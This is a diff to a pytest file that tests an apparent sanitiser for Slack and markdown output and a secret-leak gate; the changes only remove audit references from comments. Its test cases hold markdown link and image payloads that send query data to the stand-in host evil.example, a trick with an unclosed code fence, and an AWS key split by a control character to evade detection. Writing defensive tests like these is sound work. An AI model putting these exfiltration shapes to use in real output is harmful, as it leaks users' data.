@@ -112,7 +112,7 @@ def test_identifiers_an_operator_may_show_do_not_block_and_clean_text_passes():
 
 @pytest.mark.parametrize("where", ["markdown", "data"])
 def test_a_secret_the_pipeline_missed_blocks_the_message(where):
-    """Audit A-C-8 / A-C-VT: notify re-redacts on the way out, and the gate used to look only AFTER
+    """Notify re-redacts on the way out, and the gate used to look only AFTER
     that - so G5 could never fire, and its test reached BLOCK only by monkeypatching the gate. Now a
     report that still holds a secret (an upstream miss) is withheld, text and data both."""
     good = _report("h")
@@ -153,7 +153,7 @@ def test_the_report_marks_model_claims_and_shows_what_was_cited():
 
 
 @pytest.mark.parametrize("attack, gone", [
-    # audit A-C-9: every shape G3 used to let through
+    # Every shape G3 used to let through
     ("see [docs](//evil.example/c?d=x)", "evil.example"),
     ("see [docs]( relative/path?d=x )", "relative/path"),
     ("[ref]: //evil.example/c?d=x", "evil.example"),
@@ -175,15 +175,15 @@ def test_g3_catches_what_it_used_to_miss(attack, gone):
     "```\n![x](https://evil.example/c?d=1)",           # never closed: Slack renders what follows
 ])
 def test_a_fence_trick_cannot_turn_sanitising_off(text):
-    """Audit A-C-9: fence tracking was `lstrip().startswith("```")`."""
+    """Fence tracking was `lstrip().startswith("```")`."""
     assert "evil.example" not in sanitise_text(text)
 
 
 def test_real_code_blocks_stay_verbatim():
     kept = "```\n![x](https://evil.example/c)\n```"
     assert sanitise_text(kept) == kept
-    # A ~~~ block is code to CommonMark but prose to Slack, which has no ~~~ fence (second review,
-    # 2026-09-30): its inside is sanitised.
+    # A ~~~ block is code to CommonMark but prose to Slack, which has no ~~~ fence: its
+    # inside is sanitised.
     assert sanitise_text("~~~\n<img src=x>\n~~~") == "~~~\n\n~~~"
 
 
@@ -215,5 +215,5 @@ def test_a_decimal_reference_is_ascii_digits_only():
 
 def test_a_key_split_by_a_control_character_is_still_a_leak():
     """A terminal shows `AKIA<BEL>...` as one key: the view without control characters must see it whole (ninth
-    review). Without that view no test failed (plant check, S19)."""
+    review). Without that view no test failed (plant check)."""
     assert leaked_kinds("key " + AWS_ACCESS_KEY_ID[:8] + "\x07" + AWS_ACCESS_KEY_ID[8:]) == ["APIKEY"]
